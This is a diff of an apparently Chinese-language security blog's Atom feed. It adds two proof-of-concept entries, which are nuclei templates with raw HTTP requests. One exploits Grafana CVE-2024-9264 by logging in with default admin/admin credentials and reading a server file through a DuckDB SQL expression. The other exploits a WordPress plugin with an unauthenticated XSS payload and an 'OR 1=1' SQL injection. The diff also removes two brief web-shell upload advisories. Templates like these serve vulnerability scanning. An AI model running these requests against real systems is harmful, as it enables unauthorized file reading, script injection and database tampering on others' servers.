@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-17T20:45:35.144Z</updated>
+  <updated>2025-06-17T21:15:22.059Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,59 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Grafana DuckDB 文件读取/远程代码执行漏洞</title>
+    <link href="http://example.com/2025/06/17/github_2187952380/"/>
+    <id>http://example.com/2025/06/17/github_2187952380/</id>
+    <published>2025-06-17T21:15:22.061Z</published>
+    <updated>2025-06-17T21:15:22.059Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Grafana DuckDB 文件读取&#x2F;远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-9264</li></ul><p><strong>漏洞类型：</strong> 文件读取</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Grafana 通过 DuckDB 插件存在认证文件读取及可能的远程代码执行漏洞（CVE-2024-9264）。如果安装了 shellfs，则可能实现远程代码执行。</p><p><strong>产品厂商：</strong> Grafana</p><p><strong>产品名称：</strong> Grafana</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/2c689e1c001c556439782ed6a3eb7e556c6b5874/dast%2Fcves%2F2024%2FGrafana-cve-2024-9264.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/2c689e1c001c556439782ed6a3eb7e556c6b5874/dast%2Fcves%2F2024%2FGrafana-cve-2024-9264.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> cve-<span class="hljs-number">202</span>4-<span class="hljs-number">9264</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Grafana DuckDB File Read <span class="hljs-symbol">/</span> RCE (CVE-<span class="hljs-number">202</span>4-<span class="hljs-number">9264</span>)<br>  <span class="hljs-params">author:</span> r3dg33k<br>  <span class="hljs-params">severity:</span> high<br>  <span class="hljs-params">description:</span> |<br>    Grafana is vulnerable to authenticated file read and possible RCE via DuckDB plugin (CVE-<span class="hljs-number">202</span>4-<span class="hljs-number">9264</span>). If shellfs is installed, RCE is possible.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/nollium/CVE-2024-9264</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2024-9264</span><br>  <span class="hljs-params">tags:</span> grafana,duckdb,rce,file-read,cve,cve2024,authenticated<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/login</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json</span><br><br>        &#123;<br>          <span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>          <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span><br>        &#125;<br><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-operator">/</span>api<span class="hljs-operator">/</span>ds<span class="hljs-operator">/</span>query<span class="hljs-operator">?</span>ds_type<span class="hljs-operator">=</span>__expr__&amp;expression<span class="hljs-operator">=</span><span class="hljs-literal">true</span>&amp;requestId<span class="hljs-operator">=</span>Q101 HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json</span><br>        <span class="hljs-params">Cookie:</span> grafana_session<span class="hljs-operator">=</span>&#123;&#123;cookie&#125;&#125;<br><br>        &#123;<br>          <span class="hljs-string">&quot;from&quot;</span>: <span class="hljs-string">&quot;1729313027261&quot;</span>,<br>          <span class="hljs-string">&quot;queries&quot;</span>: [<br>            &#123;<br>              <span class="hljs-string">&quot;datasource&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Expression&quot;</span>,<br>                <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;__expr__&quot;</span>,<br>                <span class="hljs-string">&quot;uid&quot;</span>: <span class="hljs-string">&quot;__expr__&quot;</span><br>              &#125;,<br>              <span class="hljs-string">&quot;expression&quot;</span>: <span class="hljs-string">&quot;SELECT content FROM read_blob(&#x27;/etc/hostname&#x27;)&quot;</span>,<br>              <span class="hljs-string">&quot;hide&quot;</span>: <span class="hljs-literal">false</span>,<br>              <span class="hljs-string">&quot;refId&quot;</span>: <span class="hljs-string">&quot;B&quot;</span>,<br>              <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;sql&quot;</span>,<br>              <span class="hljs-string">&quot;window&quot;</span>: <span class="hljs-string">&quot;&quot;</span><br>            &#125;<br>          ],<br>          <span class="hljs-string">&quot;to&quot;</span>: <span class="hljs-string">&quot;1729334627261&quot;</span><br>        &#125;<br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">name:</span> cookie<br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-params">part:</span> header<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> &#x27;grafana_session<span class="hljs-operator">=</span>([^;]<span class="hljs-operator">+</span>);&#x27;<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;frames&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;values&quot;</span><br>        <span class="hljs-params">condition:</span> and<br><br>    <span class="hljs-params">matchers-condition:</span> and<br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Grafana DuckDB 文件读取&amp;#x2F;远程代码执行漏洞&lt;/p&gt;
+&lt;</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="文件读取" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Smart Google Code Inserter 认证绕过和SQL注入漏洞</title>
+    <link href="http://example.com/2025/06/17/github_3278484472/"/>
+    <id>http://example.com/2025/06/17/github_3278484472/</id>
+    <published>2025-06-17T21:15:13.387Z</published>
+    <updated>2025-06-17T21:15:13.387Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Smart Google Code Inserter 认证绕过和SQL注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2018-3810</li></ul><p><strong>漏洞类型：</strong> SQL注入</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> WordPress的Smart Google Code Inserter插件在3.5版本之前存在认证绕过漏洞，允许未认证用户在全站注入JavaScript（CVE-2018-3810）和执行SQL注入（CVE-2018-3811）。</p><p><strong>产品厂商：</strong> WordPress</p><p><strong>产品名称：</strong> Smart Google Code Inserter</p><p><strong>影响版本：</strong> &lt; 3.5</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/b59e517a2be3828d65668ba567d4f5f17f128a30/dast%2Fcves%2F2018%2FCVE-2018-3810-CVE-2018-3811.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/b59e517a2be3828d65668ba567d4f5f17f128a30/dast%2Fcves%2F2018%2FCVE-2018-3810-CVE-2018-3811.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">201</span>8-<span class="hljs-number">381</span>0-CVE-<span class="hljs-number">201</span>8-<span class="hljs-number">3811</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Smart Google Code Inserter <span class="hljs-operator">&lt;</span> <span class="hljs-number">3.5</span> <span class="hljs-operator">-</span> Auth Bypass and SQLi<br>  <span class="hljs-params">author:</span> r3dg33k<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    The Smart Google Code Inserter plugin for WordPress before version <span class="hljs-number">3.5</span> is vulnerable to authentication bypass, allowing unauthenticated users to inject JavaScript site-wide (CVE-<span class="hljs-number">201</span>8-<span class="hljs-number">3810</span>) and perform SQL injection (CVE-<span class="hljs-number">201</span>8-<span class="hljs-number">3811</span>).<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//limbenjamin.com/articles/2018/smart-google-code-inserter-wordpress-plugin-authbypass-sqli.html</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>wordpress.org<span class="hljs-operator">/</span>plugins<span class="hljs-operator">/</span>smart-google-code-inserter<span class="hljs-symbol">/</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">201</span>8-<span class="hljs-number">3810</span> <br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">false</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">2</span><br>    <span class="hljs-params">plugin:</span> smart-google-code-inserter<br>  <span class="hljs-params">tags:</span> wordpress,wp-plugin,sqli,auth-bypass,xss,cve,cve2018<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-operator">/</span>wp-admin<span class="hljs-operator">/</span>options-general.php<span class="hljs-operator">?</span>page<span class="hljs-operator">=</span>smartcode HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br><br>        <span class="hljs-attr">sgcgoogleanalytic</span><span class="hljs-operator">=</span><span class="hljs-symbol">&lt;script&gt;</span>alert(<span class="hljs-string">&quot;XSS&quot;</span>)<span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>script<span class="hljs-operator">&gt;</span>&amp;sgcwebtools<span class="hljs-operator">=</span>&amp;button<span class="hljs-operator">=</span>Save<span class="hljs-operator">+</span>Changes&amp;action<span class="hljs-operator">=</span>savegooglecode<br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-operator">/</span>wp-admin<span class="hljs-operator">/</span>options-general.php<span class="hljs-operator">?</span>page<span class="hljs-operator">=</span>smartcode HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br><br>        <span class="hljs-attr">action</span><span class="hljs-operator">=</span>saveadwords&amp;delconf<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;oId[]<span class="hljs-operator">=</span><span class="hljs-number">1</span> OR <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">-</span>-&amp;ppccap[]<span class="hljs-operator">=</span>ex:mywplead&amp;ppcpageid[]<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;ppccode[]<span class="hljs-operator">=</span>bb&amp;nchkdel1<span class="hljs-operator">=</span>on<br><br>    <span class="hljs-params">matchers-condition:</span> <span class="hljs-keyword">or</span><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-symbol">&lt;script&gt;</span>alert(<span class="hljs-string">&quot;XSS&quot;</span>)<span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>script<span class="hljs-operator">&gt;</span>&#x27;<br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> &#x27;You have successfully&#x27;<br>          <span class="hljs-operator">-</span> &#x27;SQL&#x27;<br>        <span class="hljs-params">condition:</span> and<br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> &#x27;alert\(<span class="hljs-string">&quot;XSS&quot;</span>\)&#x27;<br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Smart Google Code Inserter 认证绕过和SQL注入漏洞</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
   
   <entry>
     <title>Fastjson 反序列化远程代码执行漏洞</title>
@@ -490,54 +543,6 @@
     <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
     <category term="南风漏洞复现文库" scheme="http://example.com/tags/%E5%8D%97%E9%A3%8E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E6%96%87%E5%BA%93/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Unrestricted Upload of File with Dangerous Type vulnerability in RomanCode MapSVG allows Upload a</title>
-    <link href="http://example.com/2025/06/17/github_973525185/"/>
-    <id>http://example.com/2025/06/17/github_973525185/</id>
-    <published>2025-06-17T16:00:12.550Z</published>
-    <updated>2025-06-17T16:00:12.546Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-mm3j-jm95-33fw">https://github.com/advisories/GHSA-mm3j-jm95-33fw</a></p><p><strong>CVSS 评分：</strong> 10.0</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-47559">https://nvd.nist.gov/vuln/detail/CVE-2025-47559</a></p></li><li><p><a href="https://patchstack.com/database/wordpress/plugin/mapsvg/vulnerability/wordpress-mapsvg-plugin-8-5-32-arbitrary-file-upload-vulnerability?_s_id=cve">https://patchstack.com/database/wordpress/plugin/mapsvg/vulnerability/wordpress-mapsvg-plugin-8-5-32-arbitrary-file-upload-vulnerability?_s_id=cve</a></p></li><li><p><a href="https://github.com/advisories/GHSA-mm3j-jm95-33fw">https://github.com/advisories/GHSA-mm3j-jm95-33fw</a></p></li></ul><p><strong>描述：</strong></p><p>Unrestricted Upload of File with Dangerous Type vulnerability in RomanCode MapSVG allows Upload a Web Shell to a Web Server. This issue affects MapSVG: from n&#x2F;a through 8.5.32.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-mm3j-jm95-33fw&quot;&gt;https://github.com/advisories/GHSA-mm3j-jm95-33fw&lt;/a&gt;&lt;/p</summary>
-      
-    
-    
-    
-    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
-    
-    
-    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Unrestricted Upload of File with Dangerous Type vulnerability in NasaTheme Flozen allows Upload a</title>
-    <link href="http://example.com/2025/06/17/github_1106927511/"/>
-    <id>http://example.com/2025/06/17/github_1106927511/</id>
-    <published>2025-06-17T16:00:12.202Z</published>
-    <updated>2025-06-17T16:00:12.198Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>链接：</strong> <a href="https://github.com/advisories/GHSA-f4mc-8m8c-7xfc">https://github.com/advisories/GHSA-f4mc-8m8c-7xfc</a></p><p><strong>CVSS 评分：</strong> 10.0</p><p><strong>参考链接：</strong></p><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-49071">https://nvd.nist.gov/vuln/detail/CVE-2025-49071</a></p></li><li><p><a href="https://patchstack.com/database/wordpress/theme/flozen-theme/vulnerability/wordpress-flozen-1-5-1-arbitrary-file-upload-vulnerability?_s_id=cve">https://patchstack.com/database/wordpress/theme/flozen-theme/vulnerability/wordpress-flozen-1-5-1-arbitrary-file-upload-vulnerability?_s_id=cve</a></p></li><li><p><a href="https://github.com/advisories/GHSA-f4mc-8m8c-7xfc">https://github.com/advisories/GHSA-f4mc-8m8c-7xfc</a></p></li></ul><p><strong>描述：</strong></p><p>Unrestricted Upload of File with Dangerous Type vulnerability in NasaTheme Flozen allows Upload a Web Shell to a Web Server. This issue affects Flozen: from n&#x2F;a through n&#x2F;a.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://github.com/advisories/GHSA-f4mc-8m8c-7xfc&quot;&gt;https://github.com/advisories/GHSA-f4mc-8m8c-7xfc&lt;/a&gt;&lt;/p</summary>
-      
-    
-    
-    
-    <category term="安全公告" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/"/>
-    
-    
-    <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
     
   </entry>
   
